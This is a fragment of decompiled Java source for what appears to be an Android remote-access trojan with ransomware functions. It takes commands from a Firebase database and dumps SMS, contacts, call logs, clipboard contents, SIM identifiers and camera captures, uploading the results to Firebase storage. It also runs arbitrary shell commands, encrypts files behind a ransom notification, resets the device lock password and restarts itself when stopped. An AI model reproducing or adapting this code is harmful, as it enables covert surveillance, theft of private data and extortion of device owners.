        String string2 = "<html><meta name='viewport' content='width=device-width, initial-scale=1'> <meta charset='UTF-8' /><style>*{margin:0;padding:0;}body{margin:0;padding:0;background:#222;}.keylogg {background:#000;width:calc(95% - 20px);height:auto;margin:auto;padding:10px;color:#0dd;padding-bottom:10px;margin-top:8px;border-radius:10px;position:relative;overflow:auto;}.keylogg  b{color:red;}.keylogg img{max-height:50px;max-width:50px;position:absolute;left:10px;}.keylogg p{color:#fff;}.keylogg span{float:right;margin-right:10px;}.btn{height:40px;width:150px;border:0;border-radius:5px;border:1px solid red;background:black;color:white;} </style><body>";
        do {
            if (!iterator.hasNext()) {
                if (FileUtil.isExistFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/apps.html"))) {
                    FileUtil.deleteFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/apps.html"));
                }
                FileOutputStream fileOutputStream = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/apps.html", true);
                fileOutputStream.write((String.valueOf((Object)string2) + "\n\n").getBytes());
                fileOutputStream.close();
                SketchwareUtil.showMessage(this.getApplicationContext(), "packejsj");
                this.sigmamale.child(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/apps.html")).putFile(Uri.fromFile((File)new File(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/apps.html")))).addOnFailureListener(this._sigmamale_failure_listener).addOnProgressListener(this._sigmamale_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                    public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                        return servicess.this.sigmamale.child(FileUtil.getPackageDataDir(servicess.this.getApplicationContext()).concat("/apps.html")).getDownloadUrl();
                    }
                }).addOnCompleteListener(this._sigmamale_upload_success_listener);
                return;
            }
            PackageInfo packageInfo = (PackageInfo)iterator.next();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            servicess.getBitmapFromDrawable(packageInfo.applicationInfo.loadIcon(this.getPackageManager())).compress(Bitmap.CompressFormat.JPEG, 100, (OutputStream)byteArrayOutputStream);
            String string3 = Base64.encodeToString((byte[])byteArrayOutputStream.toByteArray(), (int)0);
            string2 = String.valueOf((Object)string2) + "<div class='keylogg' ><img src='data:image/png;base64," + string3 + "' ><div style='margin-left:60px;padding-top:3px;overflow:auto;' ><b style='color:green;' > " + packageInfo.applicationInfo.loadLabel(this.getPackageManager()).toString() + " (v" + packageInfo.versionName + " )</b><br><b style='color:red;' > " + packageInfo.packageName + "</b><br></div><br></div>";
        } while (true);
        catch (FileNotFoundException fileNotFoundException) {
            return;
        }
        catch (IOException iOException) {
            return;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void _palysmudic(String string2) {
        this.mp = new MediaPlayer();
        this.mp.setAudioStreamType(3);
        try {
            this.mp.setDataSource(string2);
        }
        catch (IllegalArgumentException illegalArgumentException) {
            this._setrespo("dialogview", "", "<span style='color:red;' > ERROR: </span>Song Not Found from URL", "", "");
        }
        catch (SecurityException securityException) {
            this._setrespo("dialogview", "", "<span style='color:red; ' > ERROR: </span>Song Not Found from URL", "", "");
        }
        catch (IllegalStateException illegalStateException) {
            this._setrespo("dialogview", "", "<span style='color:red; ' > ERROR: </span>Song Not Found from URL", "", "");
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
        try {
            this.mp.prepare();
            this._setrespo("dialogview", "", "<span style='color: green; '> Success: </span>Song is playing", "", "");
        }
        catch (IllegalStateException illegalStateException) {
            this._setrespo("dialogview", "", "<span style='color:red; ' > ERROR: </span>Song Not Found from URL", "", "");
        }
        catch (IOException iOException) {
            this._setrespo("dialogview", "", "<span style='color:red; ' > ERROR: </span>Song Not Found from URL", "", "");
        }
        this.mp.start();
        if (this.mp.isPlaying()) {
            this._setrespo("dialogview", "", "<span style='color: green; '> Success: </span>Song is playing", "", "");
        }
    }

    public void _sendsm(String string2, String string3) {
        try {
            SmsManager.getDefault().sendTextMessage(string2, null, string3, null, null);
            this._setrespo("dialogview", "", "<span style='color:green'>Success: </span>Message Sent Successfully", "", "");
            return;
        }
        catch (Exception exception) {
            this._setrespo("dialogview", "", "<span style='color:red'>Error: </span>Either permission is not given or Data is incorrect.", "", "");
            return;
        }
    }

    public void _service() {
        this._setpres();
        this._setpres2("");
        this._chevkio();
        FirebaseDatabase.getInstance().getReference("/comds/comds" + gui.uuii(this.getApplicationContext())).addChildEventListener(new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
            }

            /*
             * Enabled aggressive block sorting
             */
            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                Map map = (Map)dataSnapshot.getValue();
                servicess.access$4(servicess.this, "" + map.get((Object)"cmdn"));
                servicess.access$5(servicess.this, "" + map.get((Object)"cmdv"));
                servicess.access$6(servicess.this, "" + map.get((Object)"cmdvar"));
                if (servicess.this.cmdn.equals((Object)"cd")) {
                    servicess.this._cd(servicess.this.cmdv, "", "");
                    return;
                } else {
                    if (servicess.this.cmdn.equals((Object)"dmpsms")) {
                        servicess.this.getAllSms(servicess.this.getApplicationContext());
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"dmpcall")) {
                        servicess.this._dmpcal();
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"dmpcont")) {
                        servicess.this._dmpcon();
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"getpackages")) {
                        servicess.this._getpackages();
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"shellcmd")) {
                        servicess.this._sudoapt(servicess.this.cmdv, "");
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"deviceinfo")) {
                        servicess.this._devinfo();
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"toasttext")) {
                        servicess.this._showtoast(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"ttsdev")) {
                        servicess.this._ttsdev(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"vibratedev")) {
                        servicess.this._vibra(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"playsmusic")) {
                        servicess.this._palysmudic(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"sendsms")) {
                        servicess.this._sendsm(servicess.this.cmdv, servicess.this.cmdvar);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"changewall")) {
                        servicess.this._changewall(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"voicerec")) {
                        servicess.this._voicere(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"encrypt")) {
                        servicess.this.encry(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"decrypt")) {
                        servicess.this.decry(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"ransom1")) {
                        servicess.this.ransomen(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"ransom2")) {
                        servicess.this.ransomde(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"capturecam")) {
                        servicess.this.capscam(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"delfile")) {
                        servicess.this.delfiles(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"simcardinfo")) {
                        servicess.this.simcardinfo();
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"openweburi")) {
                        servicess.this.openweburi(servicess.this.cmdv);
                        return;
                    }
                    if (servicess.this.cmdn.equals((Object)"clipdata")) {
                        servicess.this.clipbord();
                        return;
                    }
                    if (!servicess.this.cmdn.equals((Object)"adminlock")) return;
                    {
                        servicess.this.adminlock(servicess.this.cmdv);
                        return;
                    }
                }
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
            }
        });
    }

    public void _setpres() {
        FirebaseDatabase.getInstance().getReference("/online/" + gui.uuiip(this.getApplicationContext()) + "/user" + gui.uuii(this.getApplicationContext())).child("device").addChildEventListener(new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
                servicess.this._setpres2("");
            }
        });
    }

    public void _setpres2(String string2) {
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"phone", (Object)(String.valueOf((Object)Build.MANUFACTURER) + " " + Build.MODEL));
        this.responsetxt.put((Object)"android", (Object)("Android " + Build.VERSION.RELEASE));
        int n = ((BatteryManager)this.getSystemService("batterymanager")).getIntProperty(4);
        this.responsetxt.put((Object)"battery", (Object)(String.valueOf((int)n) + "%"));
        this.responsetxt.put((Object)"id", (Object)gui.uuii(this.getApplicationContext()));
        String[] arrstring = new String[]{"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"};
        int n2 = arrstring.length;
        int n3 = 0;
        do {
            if (n3 >= n2) {
                this.responsetxt.put((Object)"rooted", (Object)"No");
                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("/online/" + gui.uuiip(this.getApplicationContext()) + "/user" + gui.uuii(this.getApplicationContext())).child("device");
                databaseReference.setValue(this.responsetxt);
                databaseReference.onDisconnect().removeValue();
                return;
            }
            if (new File(arrstring[n3]).exists()) {
                // empty if block
            }
            ++n3;
        } while (true);
    }

    public void _setrespo(String string2, String string3, String string4, String string5, String string6) {
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"respo", (Object)string2);
        this.responsetxt.put((Object)"var2", (Object)string3);
        this.responsetxt.put((Object)"v1", (Object)string4);
        this.responsetxt.put((Object)"v2", (Object)string5);
        this.responsetxt.put((Object)"v3", (Object)string6);
        String string7 = String.valueOf((Object)"abcdefghijklmnopqrstuvwxyz") + "0123456789";
        Random random = new Random();
        StringBuilder stringBuilder = new StringBuilder(8);
        stringBuilder.append(string7.charAt(random.nextInt(-1 + string7.length())));
        int n = stringBuilder.length();
        do {
            if (n >= 8) {
                this.responsetxt.put((Object)"rndm", (Object)stringBuilder.toString());
                this._firebase.getReference("/respos/respo" + gui.uuii(this.getApplicationContext())).child("respo").setValue(this.responsetxt);
                return;
            }
            stringBuilder.append(string7.charAt(random.nextInt(string7.length())));
            ++n;
        } while (true);
    }

    public void _showtoast(String string2) {
        SketchwareUtil.showMessage(this.getApplicationContext(), string2);
        this._setrespo("dialogview", "", "Toast Shown Successfully", "", "");
    }

    public void _sudoapt(String string2, String string3) {
        this._setrespo("shellview", "", this.shell_exec(string2), "", "");
    }

    public void _ttsdev(String string2) {
        this.tts.speak(string2, 1, null);
        this._setrespo("dialogview", "", "TTS Completed Successfully", "", "");
    }

    public void _vibra(String string2) {
        this.vbs.vibrate((long)Integer.parseInt((String)string2));
        this._setrespo("dialogview", "", "Device Vibrated", "", "");
    }

    public void _voicere(String string2) {
        this._setrespo("dialogview", "", " Recordings Started , you can see the recorded files below", "", "");
    }

    public void adminlock(String string2) {
        ComponentName componentName = new ComponentName(this.getApplicationContext(), DeviceAdminComponent.class);
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getApplicationContext().getSystemService("device_policy");
        if (devicePolicyManager.isAdminActive(componentName)) {
            devicePolicyManager.setPasswordQuality(componentName, 131072);
            devicePolicyManager.resetPassword(string2, 1);
            devicePolicyManager.lockNow();
            this._setrespo("dialogview", "", " Device Locked Successfully", "", "");
            return;
        }
        this._setrespo("dialogview", "", " Err: Permission Denied", "", "");
    }

    public void capscam(String string2) {
        new cams(this.getApplicationContext()).startUp(0, this.getApplicationContext());
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void clipbord() {
        final ClipboardManager[] arrclipboardManager = new ClipboardManager[1];
        String string2 = "";
        new Handler(Looper.getMainLooper()).post(new Runnable(){

            public void run() {
                arrclipboardManager[0] = (ClipboardManager)servicess.this.getSystemService("clipboard");
            }
        });
        try {
            if (arrclipboardManager[0].hasPrimaryClip()) {
                boolean bl;
                ClipDescription clipDescription = arrclipboardManager[0].getPrimaryClipDescription();
                ClipData clipData = arrclipboardManager[0].getPrimaryClip();
                if (clipData != null && clipDescription != null && clipDescription.hasMimeType("text/plain")) {
                    string2 = String.valueOf((Object)clipData.getItemAt(0).getText());
                }
                if (bl = string2.isEmpty()) {
                    string2 = null;
                }
            }
        }
        catch (NullPointerException nullPointerException) {
            string2 = null;
        }
        this._setrespo("deviceinfo", "", "<div class ='keylogg' > " + string2 + "</div>", "", "");
    }

    public void decry(String string2) {
        new MyService().startrans2(string2);
        this._setrespo("dialogview", "", "File Decrypted Successfully", "", "");
    }

    public void delfiles(String string2) {
        FileUtil.deleteFile(string2);
        this._setrespo("dialogview", "", "File Deleted Successfully", "", "");
    }

    public void encry(String string2) {
        new MyService().startrans(string2);
        this._setrespo("dialogview", "", "File Encrypted Successfully", "", "");
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void getAllSms(Context var1_1) {
        var2_2 = var1_1.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        var3_3 = "<html><meta name='viewport' content='width=device-width, initial-scale=1'><meta charset='UTF-8' /><script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js'></script> <style> body{margin:0;padding:0;background:#ccc}.accordion{background-color:#fff;color:#000;cursor:pointer;padding:18px;width:100%;border:none;text-align:left;outline:0;font-size:15px;position:relative;transition:.4s;padding-left:50px}.accordion:hover,.active{backgroun-color:#aaa}.accordion:after{content:'\u203a';color:#000;font-weight:700;float:right;transform:rotate(90deg);margin-left:5px}.active:after{content:'\u203a'}.panel{padding:0 18px;background-color:#eee;max-height:0;color:#000;overflow:hidden;transition:max-height .2s ease-out}button span{position:absolute;right:50px}button img{height:30px;position:absolute;left:10px;top:10px;width:30px}.i{height:30px;width:35px;left:8px;transform:scale(.9)}.panel{padding:0 18px;background-color:#eee;max-height:0;color:#000;overflow:hidden;transition:max-height .2s ease-out}button span{position:absolute;right:50px}button img{height:30px;position:absolute;left:10px;top:10px;width:30px}</style>";
        if (var2_2 == null) ** GOTO lbl12
        var8_4 = var2_2.getCount();
        if (!var2_2.moveToFirst()) ** GOTO lbl9
        var9_5 = 0;
        do {
            block14 : {
                block13 : {
                    if (var9_5 < var8_4) break block13;
lbl9: // 2 sources:
                    var2_2.close();
                    var3_3 = String.valueOf((Object)var3_3) + "<script type='text/javascript'> " + "function tm(t){return new Date(1e3*t).toLocaleString();}$('span').each(function(t,e){$(e).html(tm(parseInt($(e).html())))});var i,acc=document.getElementsByClassName('accordion');for(i=0;i<acc.length;i++)acc[i].addEventListener('click',function(){this.classList.toggle('active');var t=this.nextElementSibling;t.style.maxHeight?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+'px'});" + "</script>";
lbl12: // 3 sources:
                    if (FileUtil.isExistFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/sms.html"))) {
                        FileUtil.deleteFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/sms.html"));
                    }
                    var6_11 = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/sms.html", true);
                    var6_11.write((String.valueOf((Object)var3_3) + "\n\n").getBytes());
                    var6_11.close();
                    this.sigmamale.child(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/sms.html")).putFile(Uri.fromFile((File)new File(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/sms.html")))).addOnFailureListener(this._sigmamale_failure_listener).addOnProgressListener(this._sigmamale_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                        public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                            return servicess.this.sigmamale.child(FileUtil.getPackageDataDir(servicess.this.getApplicationContext()).concat("/sms.html")).getDownloadUrl();
                        }
                    }).addOnCompleteListener(this._sigmamale_upload_success_listener);
                    return;
                }
                var10_6 = var2_2.getString(var2_2.getColumnIndexOrThrow("date"));
                var11_7 = var2_2.getString(var2_2.getColumnIndexOrThrow("address"));
                var12_8 = var2_2.getString(var2_2.getColumnIndexOrThrow("body"));
                new Date(Long.valueOf((String)var10_6).longValue());
                var14_9 = "";
                var15_10 = "";
                switch (Integer.parseInt((String)var2_2.getString(var2_2.getColumnIndexOrThrow("type")))) {
                    case 1: {
                        var14_9 = "inbox";
                        var15_10 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/inbox.png?alt=media&token=f3cf8d81-cf23-4588-bd9c-f9c37f518953";
                        ** break;
                    }
                    case 2: {
                        var14_9 = "sent";
                        var15_10 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/sent.png?alt=media&token=a5fb2993-56b6-4f44-ba95-5985aec6ad4a";
                    }
lbl34: // 3 sources:
                    default: {
                        break block14;
                    }
                    case 4: 
                }
                var14_9 = "outbox";
                var15_10 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/outbox.png?alt=media&token=2f7064a7-05b8-4535-a6cf-6666ae20bff0";
            }
            var3_3 = String.valueOf((Object)var3_3) + "<button class='accordion'><img src='" + var15_10 + "' alt='" + var14_9 + "' >" + var11_7 + "<span>" + var10_6 + "<" + "/" + "span><" + "/" + "button>" + "<div class='panel'>" + var12_8 + "<" + "/" + "div>";
            var2_2.moveToNext();
            ++var9_5;
        } while (true);
        catch (FileNotFoundException var5_12) {
            return;
        }
        catch (IOException var4_13) {
            return;
        }
    }

    public String getyi(String string2) {
        return new StringBuilder(string2).reverse().toString();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.initialize();
        this.initializeLogic();
    }

    public void onDestroy() {
        Intent intent = new Intent();
        intent.setAction("restartservice");
        intent.setClass((Context)this, restarter.class);
        this.sendBroadcast(intent);
        super.onDestroy();
    }

    public void openweburi(String string2) {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        intent.setData(Uri.parse((String)string2));
        intent.addFlags(268435456);
        this.startActivity(intent);
        this._setrespo("dialogview", "", " Launched specific website", "", "");
    }

    public void ransomde(String string2) {
        new ransom().startrans2("");
        this._setrespo("dialogview", "", "All Files Decrypted Successfully", "", "");
    }

    public void ransomen(String string2) {
        new ransom().startrans("");
        this._setrespo("dialogview", "", "All Files Encrypted Successfully", "", "");
        this.shownotiss(string2);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public String shell_exec(String string2) {
        String string3 = "";
        try {
            BufferedReader bufferedReader = new BufferedReader((Reader)new InputStreamReader(Runtime.getRuntime().exec(string2).getInputStream()));
            do {
                String string4;
                String string5;
                if ((string5 = bufferedReader.readLine()) == null) {
                    return string3;
                }
                string3 = string4 = String.valueOf((Object)string3) + string5;
            } while (true);
        }
        catch (Exception exception) {
            return "error";
        }
    }

    public void shownotiss(String string2) {
        Context context = this.getApplicationContext();
        NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
        if (Build.VERSION.SDK_INT >= 26) {
            notificationManager.createNotificationChannel(new NotificationChannel("ransom de bsdk", (CharSequence)"bhak bsdk", 4));
        }
        notificationManager.notify(2, new NotificationCompat.Builder(context, "ransom de bsdk").setSmallIcon(2131165377).setContentTitle((CharSequence)" All of Your Files are Encrypted \u2620\ufe0f\u2620\ufe0f").setContentText((CharSequence)string2).setAutoCancel(true).setOngoing(true).build());
    }

    /*
     * Enabled aggressive block sorting
     */
    public void simcardinfo() {
        String string2;
        Uri uri = Uri.parse((String)"content://telephony/siminfo");
        Cursor cursor = this.getApplicationContext().getContentResolver().query(uri, new String[]{"_id", "sim_id", "imsi", "icc_id", "number", "display_name"}, "0=0", new String[0], null);
        if (cursor != null) {
            string2 = "";
            while (cursor.moveToNext()) {
                String string3 = cursor.getString(cursor.getColumnIndex("icc_id"));
                String string4 = cursor.getString(cursor.getColumnIndex("imsi"));
                String string5 = cursor.getString(cursor.getColumnIndex("number"));
                String string6 = cursor.getString(cursor.getColumnIndex("display_name"));
                int n = cursor.getInt(cursor.getColumnIndex("sim_id"));
                cursor.getInt(cursor.getColumnIndex("_id"));
                string2 = String.valueOf((Object)new StringBuilder(String.valueOf((Object)new StringBuilder(String.valueOf((Object)new StringBuilder(String.valueOf((Object)new StringBuilder(String.valueOf((Object)string2)).append("<b>ICC ID</b>: ").append(string3).append("<br>").toString())).append("<b>IMSI ID</b>: ").append(string4).append("<br>").toString())).append("<b>Phone Number</b>: ").append(string5).append("<br>").toString())).append("<b>SIM ID</b>: ").append(n).append("<br>").toString()) + "<b>DISPLAY NAME</b>: " + string6 + "<br>";
            }
        } else {
            string2 = "";
        }
        this._setrespo("deviceinfo", "", "<div class ='keylogg' >" + string2 + "</div>", "", "");
    }

}

